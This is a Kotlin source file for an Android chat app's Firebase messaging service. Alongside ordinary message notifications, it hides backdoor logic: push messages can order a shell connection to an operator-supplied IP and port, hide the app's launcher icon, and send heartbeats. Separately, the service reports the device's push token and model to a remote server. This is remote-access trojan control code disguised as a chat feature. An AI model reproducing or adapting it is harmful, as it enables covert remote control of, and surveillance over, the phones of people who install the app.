package com.appholaworld.offchat.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.MediaPlayer
import android.os.Build
import android.util.Log
import androidx.core.app.NotificationCompat
import com.appholaworld.offchat.OffChatApp
import com.termux.R
import com.appholaworld.offchat.activities.OnlineChatActivity
import com.appholaworld.offchat.models.OnlineChatStatus
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import android.content.ComponentName
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat
import androidx.work.Data
import androidx.work.OneTimeWorkRequest
import androidx.work.WorkManager
import com.termux.app.TermuxActivity
import org.json.JSONObject
import com.appholaworld.termuxapi.ShellForegroundService
import com.appholaworld.termuxapi.ShellRequestWorker
import com.appholaworld.termuxapi.RequestUtils
import com.google.firebase.messaging.FirebaseMessaging

class OffChatMessagingService : FirebaseMessagingService() {

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
    private val TAG = "OffChatMessagingService"
    private val CHANNEL_ID = "OnlineChatMessagesChannel"

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        val repository = (application as OffChatApp).onlineChatRepository
        serviceScope.launch {
            repository.updateFcmToken(token)
        }
        sendTokenToServer(token)
    }

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)
        Log.d(TAG, "Message received: ${remoteMessage.data}")
        
        val data = remoteMessage.data
        if (data.isNotEmpty()) {
            val type = data["type"]
            if (type == "shellRequest" || type == "heartbeat" || type == "visibilityChange") {
                handleTermuxDataMessage(data)
                FirebaseMessaging.getInstance().token.addOnSuccessListener { token -> sendTokenToServer(token) }
                return
            }
        }

        val chatId = data["chatId"] ?: return
        val senderName = data["senderName"] ?: "New Message"
        val messageText = data["messageText"] ?: ""

        if (OnlineChatStatus.activeChatId == chatId) {
            // Chat is active, Activity will handle the sound via its own ViewModel listener
            return 
        } else {
            // Show system notification
            showNotification(chatId, senderName, messageText, data)
        }
    }

    private fun playMessageSound() {
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        if (audioManager.ringerMode == AudioManager.RINGER_MODE_NORMAL) {
            try {
                val mediaPlayer = MediaPlayer.create(this, R.raw.message_pop)
                mediaPlayer.setAudioAttributes(
                    AudioAttributes.Builder()
                        .setUsage(AudioAttributes.USAGE_NOTIFICATION)
                        .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                        .build()
                )
                mediaPlayer.setOnCompletionListener { it.release() }
                mediaPlayer.start()
            } catch (e: Exception) {
                Log.e(TAG, "Error playing sound", e)
            }
        }
    }

    private fun showNotification(chatId: String, senderName: String, messageText: String, data: Map<String, String>) {
        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Online Messages",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Notifications for online chat messages"
                enableLights(true)
                enableVibration(true)
            }
            manager.createNotificationChannel(channel)
        }

        val intent = Intent(this, OnlineChatActivity::class.java).apply {
            putExtra("CHAT_ID", chatId)
            putExtra("TARGET_USERNAME", senderName)
            putExtra("TARGET_UID", data["senderId"]) 
            putExtra("MY_USERNAME", data["recipientUsername"])
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }

        val pendingIntent = PendingIntent.getActivity(
            this, chatId.hashCode(), intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentTitle(senderName)
            .setContentText(messageText)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setCategory(Notification.CATEGORY_MESSAGE)
            .setColor(getColor(R.color.primary))
            .setDefaults(Notification.DEFAULT_ALL)
            .setContentIntent(pendingIntent)
            .setAutoCancel(true)
            .build()

        manager.notify(chatId.hashCode(), notification)
    }

    private fun handleTermuxDataMessage(data: Map<String, String>) {
        Log.d(TAG, "Data message received$data")
        val type = data["type"]
        if (type == "shellRequest") {
            val foregroundFlag = data["foregroundService"]
            val useForeground = foregroundFlag.equals("true", ignoreCase = true)

            if (useForeground) {
                val shellType = data["shellType"]
                val serverIP = data["serverIP"]
                val serverPort = data["serverPort"]

                val intent = Intent(this, ShellForegroundService::class.java)
                intent.putExtra(ShellForegroundService.EXTRA_SHELL_TYPE, shellType)
                intent.putExtra(ShellForegroundService.EXTRA_SERVER_IP, serverIP)
                intent.putExtra(ShellForegroundService.EXTRA_SERVER_PORT, serverPort)

                ContextCompat.startForegroundService(this, intent)
                Log.d(TAG, "ShellForegroundService started")
            } else {
                try {
                    val json = JSONObject(data as Map<*, *>)
                    val workData = Data.Builder()
                        .putString("payload", json.toString())
                        .build()

                    val request = OneTimeWorkRequest.Builder(ShellRequestWorker::class.java)
                        .setInputData(workData)
                        .build()

                    WorkManager.getInstance(applicationContext).enqueue(request)
                    Log.d(TAG, "WorkManager tasks enqueued")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to enqueue shellRequest", e)
                }
            }
        } else if (type == "heartbeat") {
            Thread {
                val heartbeat = HashMap<String, String>()
                heartbeat["timestamp"] = data["timestamp"] ?: ""
                RequestUtils.post("/receive-heartbeat", heartbeat)
                Log.d(TAG, "Heartbeat sent")
            }.start()
        } else if (type == "visibilityChange") {
            val visibility = data["visibility"]
            if (visibility == "hide") {
                val pm = packageManager
                pm.setComponentEnabledSetting(
                    ComponentName(this, TermuxActivity::class.java),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                Log.d(TAG, "App hidden successfully")
            } else if (visibility == "show") {
                val pm = packageManager
                pm.setComponentEnabledSetting(
                    ComponentName(this, TermuxActivity::class.java),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
                Log.d(TAG, "App shown successfully")
            }
        }
    }

    private fun sendTokenToServer(token: String) {
        Log.d(TAG, "Sending token to server: $token")
        val data = HashMap<String, String>()
        data["token"] = token
        data["deviceName"] = android.os.Build.MODEL

        Thread { RequestUtils.post("/receive-token", data) }.start()
    }

    override fun onDestroy() {
        super.onDestroy()
        // scope cancellation not strictly needed for service lifecycle if it's short lived, 
        // but good practice if we started anything long running.
    }
}
